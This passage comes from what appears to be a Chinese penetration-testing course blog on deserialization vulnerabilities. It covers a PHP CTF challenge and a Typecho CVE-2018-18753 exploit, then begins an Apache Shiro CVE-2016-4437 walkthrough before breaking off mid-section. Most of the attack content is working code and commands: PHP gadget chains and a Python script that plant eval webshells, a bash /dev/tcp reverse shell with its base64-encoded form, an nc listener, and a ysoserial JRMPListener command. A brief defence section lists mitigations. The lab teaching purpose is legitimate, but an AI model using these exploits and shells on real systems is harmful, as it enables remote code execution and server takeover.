<span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">poc</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'shell.php'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&lt;?php eval($_POST["shell"]);?&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Success!!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'fail to getshell!!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token function">get_object_vars</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=&gt;</span> <span class="token variable">$v</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token variable">$k</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"waking up...n"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'shell'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$poc</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token variable">$poc</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// PHP5小于5.6.25或PHP7小于7.0.10</span><span class="token comment">// 1改为大于1的数字</span><span class="token comment">// 将Testpoc改为%00Test%00poc</span><span class="token comment">// O:4:"Test":2:{s:9:"%00Test%00poc";s:5:"shell";}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="构造序列化"><a href="#构造序列化" class="headerlink" title="构造序列化"></a>构造序列化</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">xctf</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'111'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">xctf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// O:4:"xctf":2:{s:4:"flag";s:3:"111";}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload</p><p><code>http://61.147.171.105:53418/?code=O:4:"xctf":2:{s:4:"flag";s:3:"111";}</code></p><p>the answer is : cyberpeace{01ac23bddb1dc4962e5a3fa5a6853627}</p><p>cyberpeace{01ac23bddb1dc4962e5a3fa5a6853627}</p><h1 id="typecho反序列化漏洞分析"><a href="#typecho反序列化漏洞分析" class="headerlink" title="typecho反序列化漏洞分析"></a>typecho反序列化漏洞分析</h1><h2 id="题目地址-1"><a href="#题目地址-1" class="headerlink" title="题目地址"></a>题目地址</h2><h3 id="CVE-2018-18753"><a href="#CVE-2018-18753" class="headerlink" title="CVE-2018-18753"></a>CVE-2018-18753</h3><p><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-18753">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-18753</a> </p><h3 id="typecho下载地址"><a href="#typecho下载地址" class="headerlink" title="typecho下载地址"></a>typecho下载地址</h3><p><a href="https://github.com/typecho/typecho/releases/tag/v1.0-14.10.10-release">https://github.com/typecho/typecho/releases/tag/v1.0-14.10.10-release</a> </p><p>PHP版本：5.4.5nts （PHPStudy） </p><p>在数据库新建一个库，命名为typecho</p><h3 id="type-poc-php"><a href="#type-poc-php" class="headerlink" title="type-poc.php"></a>type-poc.php</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Typecho_Feed</span><span class="token punctuation">{</span>    <span class="token keyword">const</span> <span class="token constant">RSS1</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'RSS 1.0'</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">RSS2</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'RSS 2.0'</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">ATOM1</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ATOM 1.0'</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">DATE_RFC822</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'r'</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">DATE_W3CDTF</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'c'</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">EOL</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$_type</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$_items</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_type</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">::</span><span class="token constant">RSS2</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_items</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>            <span class="token string single-quoted-string">'title'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'1'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'link'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'1'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'date'</span> <span class="token operator">=&gt;</span> <span class="token number">1508895132</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'category'</span> <span class="token operator">=&gt;</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Typecho_Request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'author'</span> <span class="token operator">=&gt;</span> <span class="token keyword">new</span> <span class="token class-name">Typecho_Request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Typecho_Request</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$_params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$_filter</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_params</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'screenName'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'phpinfo()'</span><span class="token punctuation">;</span>    <span class="token comment">//替换phpinfo()这里进行深度利用</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_filter</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'assert'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$exp</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>    <span class="token string single-quoted-string">'adapter'</span> <span class="token operator">=&gt;</span> <span class="token keyword">new</span> <span class="token class-name">Typecho_Feed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'prefix'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'typecho_'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$exp</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>//YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YTo1OntzOjU6InRpdGxlIjtzOjE6IjEiO3M6NDoibGluayI7czoxOiIxIjtzOjQ6ImRhdGUiO2k6MTUwODg5NTEzMjtzOjg6ImNhdGVnb3J5IjthOjE6e2k6MDtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fXM6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6ODoidHlwZWNob18iO30=<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将文件加入他typecho里</p><p>访问：<a href="http://192.168.31.193:8095/type-poc.php">http://192.168.31.193:8095/type-poc.php</a></p><p>得到pyload</p><p><img src="/assets/image-20221126203439904.png" alt="image-20221126203439904"></p><p>访问：</p><p><a href="http://192.168.31.193:8095/install.php?finish=%20HTTP/1.1">http://192.168.31.193:8095/install.php?finish=%20HTTP/1.1</a></p><p>使用hackbar插件</p><p><img src="/assets/image-20221126204151988.png" alt="image-20221126204151988"></p><p><img src="/assets/image-20221126204513999.png" alt="image-20221126204513999"></p><h3 id="type-poc-py"><a href="#type-poc-py" class="headerlink" title="type-poc.py"></a>type-poc.py</h3><p>作用：在当前网页上生成一句话木马</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">import requests import sys url <span class="token operator">=</span> <span class="token string double-quoted-string">"http://192.168.31.193:8095/install.php?finish="</span>payload <span class="token operator">=</span> <span class="token string double-quoted-string">"YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YTo1OntzOjU6InRpdGxlIjtzOjE6IjEiO3M6NDoibGluayI7czoxOiIxIjtzOjQ6ImRhdGUiO2k6MTUwODg5NTEzMjtzOjg6ImNhdGVnb3J5IjthOjE6e2k6MDtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjU4OiJmcHV0cyhmb3Blbignc2hlbGwucGhwJywndycpLCc8Pz1AZXZhbCgkX1JFUVVFU1RbNzc3XSk/PicpIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6ImFzc2VydCI7fX19czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NTg6ImZwdXRzKGZvcGVuKCdzaGVsbC5waHAnLCd3JyksJzw/PUBldmFsKCRfUkVRVUVTVFs3NzddKT8+JykiO31zOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9maWx0ZXIiO2E6MTp7aTowO3M6NjoiYXNzZXJ0Ijt9fX19fXM6NjoicHJlZml4IjtzOjg6InR5cGVjaG9fIjt9"</span> postData <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string double-quoted-string">"__typecho_config"</span><span class="token punctuation">:</span>payload<span class="token punctuation">}</span> header <span class="token operator">=</span><span class="token punctuation">{</span> <span class="token string double-quoted-string">"Referer"</span><span class="token punctuation">:</span>url<span class="token punctuation">,</span> <span class="token string double-quoted-string">"User-Agent"</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0"</span><span class="token punctuation">}</span> <span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span> res <span class="token operator">=</span> requests<span class="token operator">.</span><span class="token function">get</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span> <span class="token keyword">if</span> res<span class="token operator">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"[+] install.php exist!"</span><span class="token punctuation">)</span> <span class="token keyword">else</span><span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"[-] install.php not exist"</span><span class="token punctuation">)</span> sys<span class="token operator">.</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> res <span class="token operator">=</span> requests<span class="token operator">.</span><span class="token function">post</span><span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">,</span>data <span class="token operator">=</span> postData<span class="token punctuation">,</span>headers <span class="token operator">=</span> header<span class="token punctuation">)</span> res <span class="token operator">=</span> requests<span class="token operator">.</span><span class="token function">get</span><span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string double-quoted-string">"shell.php"</span><span class="token punctuation">)</span> <span class="token keyword">if</span> res<span class="token operator">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"[+] Shell.php write success!"</span><span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Shell path :"</span><span class="token punctuation">,</span>url<span class="token operator">+</span><span class="token string double-quoted-string">"shell.php"</span><span class="token punctuation">)</span> <span class="token keyword">else</span><span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"[-] GetShell Error!"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="运行type-poc-py"><a href="#运行type-poc-py" class="headerlink" title="运行type-poc.py"></a>运行type-poc.py</h3><pre class="line-numbers language-none"><code class="language-none">┌──(root㉿guoyx)-[/home/kali]└─# python3 type-poc.py   http://192.168.31.193:8095/install.php?finish=[+] install.php exist![+] Shell.php write success!Shell path : http://192.168.31.193:8095/install.php?finish=shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>生成一句话木马成功，使用蚁剑链接</p><p><a href="http://192.168.31.193:8095/shell.php">http://192.168.31.193:8095/shell.php</a></p><p><img src="/assets/image-20221126205327772.png" alt="image-20221126205327772"></p><p><img src="/assets/image-20221126205616002.png" alt="image-20221126205616002"></p><p>连接成功</p><p>这个漏洞主要源自typecho安装程序install.php里有<code>unserialize</code>反序列化漏洞…</p><p>![屏幕截图 2022-11-26 210739](assets/屏幕截图 2022-11-26 210739.png)</p><h1 id="反序列化漏洞修复和防御"><a href="#反序列化漏洞修复和防御" class="headerlink" title="反序列化漏洞修复和防御"></a>反序列化漏洞修复和防御</h1><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>针对unserialize和Magic函数审计 </p><p>对用户输入的内容过滤 </p><p>白名单，限制反序列化的类；不能动态传参</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/21-fan-xu-lie-hua/java-fan-xu-lie-hua/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/21-fan-xu-lie-hua/java-fan-xu-lie-hua/</url>
      
        <content type="html"><![CDATA[<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ol><li>JDK解压版：包含Java运行时环境 </li><li>IDEA ：开发工具 </li><li>Maven ：jar包依赖管理 </li><li>Tomcat ：HTTP服务器 </li><li>Burp Suite ：发送HTTP请求 </li><li>Kali ：启动相关服务</li></ol><h2 id="总体规划"><a href="#总体规划" class="headerlink" title="总体规划"></a>总体规划</h2><ol><li>Java反序列化漏洞 </li><li>Apache Commons Collections反序列化漏洞 </li><li>Alibaba Fastjson反序列化漏洞 </li><li>Apache Shiro反序列化漏</li></ol><h1 id="Java反序列化漏洞"><a href="#Java反序列化漏洞" class="headerlink" title="Java反序列化漏洞"></a>Java反序列化漏洞</h1><h1 id="课程目录"><a href="#课程目录" class="headerlink" title="课程目录"></a>课程目录</h1><ol><li>序列化和反序列化的含义和用途 </li><li>Java序列化演示 </li><li>反序列化漏洞的出现</li></ol><h1 id="序列化和反序列化的含义和用途"><a href="#序列化和反序列化的含义和用途" class="headerlink" title="序列化和反序列化的含义和用途"></a>序列化和反序列化的含义和用途</h1><h2 id="Java序列化和反序列化"><a href="#Java序列化和反序列化" class="headerlink" title="Java序列化和反序列化"></a>Java序列化和反序列化</h2><p><img src="/assets/image-20221127095350744.png" alt="image-20221127095350744"></p><h2 id="序列化主要使用场景"><a href="#序列化主要使用场景" class="headerlink" title="序列化主要使用场景"></a>序列化主要使用场景</h2><ol><li>持久化内存数据 </li><li>网络传输对象 </li><li>远程方法调用(RMI)</li><li>……</li></ol><h2 id="JSON格式"><a href="#JSON格式" class="headerlink" title="JSON格式"></a>JSON格式</h2><p><img src="/assets/image-20221127095441986.png" alt="image-20221127095441986"></p><h1 id="Java序列化演示"><a href="#Java序列化演示" class="headerlink" title="Java序列化演示"></a>Java序列化演示</h1><p>Person对象，实现Serializable接口</p><h2 id="序列化格式"><a href="#序列化格式" class="headerlink" title="序列化格式"></a>序列化格式</h2><p>参考： </p><p><a href="https://docs.oracle.com/javase/8/docs/platform/serialization/spec/serialTOC.html">https://docs.oracle.com/javase/8/docs/platform/serialization/spec/serialTOC.html</a></p><p><a href="https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html#a10258">https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html#a10258</a></p><h2 id="java序列化和反序列化"><a href="#java序列化和反序列化" class="headerlink" title="java序列化和反序列化"></a>java序列化和反序列化</h2><p>序列化</p><p>java.io.ObjectOutputStream.writeObject() </p><p>反序列化 </p><p>java.io.ObjectInputStream.<strong>readObject</strong>()</p><h1 id="反序列化漏洞的出现"><a href="#反序列化漏洞的出现" class="headerlink" title="反序列化漏洞的出现"></a>反序列化漏洞的出现</h1><h2 id="自定义反序列化"><a href="#自定义反序列化" class="headerlink" title="自定义反序列化"></a>自定义反序列化</h2><ol><li>重写类的readObject()方法 </li><li>反序列过程中会执行自定义的readObject()</li></ol><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ol><li>利用自定义的readObject()方法执行代码 </li><li>寻找重写了readObject()方法的类</li></ol><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>有没有重写了readObject()的<strong>现成的</strong>类？ </p><p>package sun.reflect.annotation; </p><p>AnnotationInvocationHandler </p><p>package javax.management; </p><p>BadAttributeValueExpException</p><p> …</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/21-fan-xu-lie-hua/apache-shiro-fan-xu-lie-hua/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/21-fan-xu-lie-hua/apache-shiro-fan-xu-lie-hua/</url>
      
        <content type="html"><![CDATA[<h1 id="Apache-Shiro介绍"><a href="#Apache-Shiro介绍" class="headerlink" title="Apache Shiro介绍"></a>Apache Shiro介绍</h1><p> 一款开源安全框架 </p><h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><ul><li>身份</li><li>验证 </li><li>授权 </li><li>会话管理 </li><li>加密</li></ul><h2 id="官方sample"><a href="#官方sample" class="headerlink" title="官方sample"></a>官方sample</h2><p><a href="https://github.com/apache/shiro/releases/tag/shiro-root-1.2.4">https://github.com/apache/shiro/releases/tag/shiro-root-1.2.4</a> </p><p>shiro-shiro-root-1.2.4\samples\web </p><h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><h3 id="CVE-2016-4437"><a href="#CVE-2016-4437" class="headerlink" title="CVE-2016-4437"></a>CVE-2016-4437</h3><p>2016年7月，1.2.4以下版本爆出RCE漏洞  </p><h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><p>登录的时候序列化保存了登录信息到 Cookie（序列化、AES加密、Base64） </p><h3 id="利用难点"><a href="#利用难点" class="headerlink" title="利用难点"></a>利用难点</h3><p>怎么获取到AES的key </p><p>怎么构造一个序列化对象</p><h1 id="漏洞原因分析"><a href="#漏洞原因分析" class="headerlink" title="漏洞原因分析"></a>漏洞原因分析</h1><h2 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h2><p><img src="/assets/image-20221127191004831.png" alt="image-20221127191004831"></p><h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p><img src="/assets/image-20221127191018157.png" alt="image-20221127191018157"></p><h1 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h1><h2 id="本地启动环境（Windows）"><a href="#本地启动环境（Windows）" class="headerlink" title="本地启动环境（Windows）"></a>本地启动环境（Windows）</h2><p>IDEA，修改pom.xml </p><p>配置tomcat服务器，启动 </p><p><a href="http://localhost:8000/samples_web_war/">http://localhost:8000/samples_web_war/</a> </p><h2 id="Docker-vulhub启动环境"><a href="#Docker-vulhub启动环境" class="headerlink" title="Docker vulhub启动环境"></a>Docker vulhub启动环境</h2><p> <code>cd /usr/local/soft/vulhub/shiro/CVE-2016-4437</code> </p><p><code>docker-compose up -d</code> </p><p><a href="http://192.168.31.76:8080/">http://192.168.31.76:8080</a> </p><p>勾选rememberme，使用 admin vulhub进行登录 </p><p>注意这里跟有没有账号密码，是不是登录成功了没有关系</p><h1 id="利用工具和方式"><a href="#利用工具和方式" class="headerlink" title="利用工具和方式"></a>利用工具和方式</h1><h2 id="什么是JRMP协议"><a href="#什么是JRMP协议" class="headerlink" title="什么是JRMP协议"></a>什么是JRMP协议</h2><p>Java Remote Method Protocol，Java远程方法 协议 </p><p>RMI使用了JRMP </p><h2 id="ysoserial工具"><a href="#ysoserial工具" class="headerlink" title="ysoserial工具"></a>ysoserial工具</h2><p><a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a> </p><p>mvn package -D skipTests </p><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>payloads/JRMPLIstener exploit/JRMPClient </p><p>在漏洞服务器开启JRMP监听 </p><p>exploit/JRMPListener payloads/JRMPClient </p><p>让漏洞服务器主动连接到恶意JRMP监听，发送 payload </p><p>二次反序列化 </p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li>先构建一个恶意命令，它的作用是让漏洞服务器连接到我们启动的JRMP服务器 </li><li>把这个命令序列化、AES加密、base64编码（payload2），写入到Cookie，发给漏洞服务 器 </li><li>漏洞服务器：base64解码、AES解密、反序列化，执行恶意命令，连接到JRMP服务器</li><li>继续发送恶意payload1，利用CC等通用库的漏洞执行命令</li></ol><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><h3 id="ysoserial-jar"><a href="#ysoserial-jar" class="headerlink" title="ysoserial.jar"></a>ysoserial.jar</h3><p>序列化 </p><h3 id="python-shiro-py"><a href="#python-shiro-py" class="headerlink" title="python shiro.py"></a>python shiro.py</h3><ul><li>AES加密 </li><li>base64编码 </li><li>Cookie</li></ul><h3 id="Brup或者python"><a href="#Brup或者python" class="headerlink" title="Brup或者python"></a>Brup或者python</h3><p>发起HTTP请求</p><h1 id="利用实现"><a href="#利用实现" class="headerlink" title="利用实现"></a>利用实现</h1><h2 id="漏洞检测与发现"><a href="#漏洞检测与发现" class="headerlink" title="漏洞检测与发现"></a>漏洞检测与发现</h2><h3 id="fofa"><a href="#fofa" class="headerlink" title="fofa"></a>fofa</h3><p><code>header="rememberme=deleteMe"</code></p><p><code>header=" shiroCookie"</code> </p><h3 id="检测工具"><a href="#检测工具" class="headerlink" title="检测工具"></a>检测工具</h3><ol><li>shiro_tool.jar 纯字符版 </li><li>ShiroExploitV2.51 </li><li>shiro_attack-v2.0.jar</li></ol><h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><h3 id="kali监听7777"><a href="#kali监听7777" class="headerlink" title="kali监听7777"></a>kali监听7777</h3><p><code>nc -lvp 7777</code> </p><h3 id="反弹连接命令准备"><a href="#反弹连接命令准备" class="headerlink" title="反弹连接命令准备"></a>反弹连接命令准备</h3><p><code>bash -i &gt;&amp; /dev/tcp/192.168.142.132/7777 0&gt;&amp;1</code> </p><p><a href="https://ares-x.com/tools/runtime-exec/">https://ares-x.com/tools/runtime-exec/</a> </p><p>得到 </p><p><code>bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE0Mi4xMzIv Nzc3NyAwPiYx}|{base64,-d}|{bash,-i}</code> </p><h3 id="kali-JRMPListener"><a href="#kali-JRMPListener" class="headerlink" title="kali JRMPListener"></a>kali JRMPListener</h3><p><code>cd /root/vuln/shiro</code> </p><p><code>java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections5 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE0Mi4xMzIv Nzc3NyAwPiYx}|{base64,-d}|{bash,-i}"</code> </p><h3 id="python生成Cookie"><a href="#python生成Cookie" class="headerlink" title="python生成Cookie"></a>python生成Cookie</h3><p>python3 shiro.py 192.168.142.132:8888 </p><p>可能需要 pip3 install pycrypto </p><p>得到 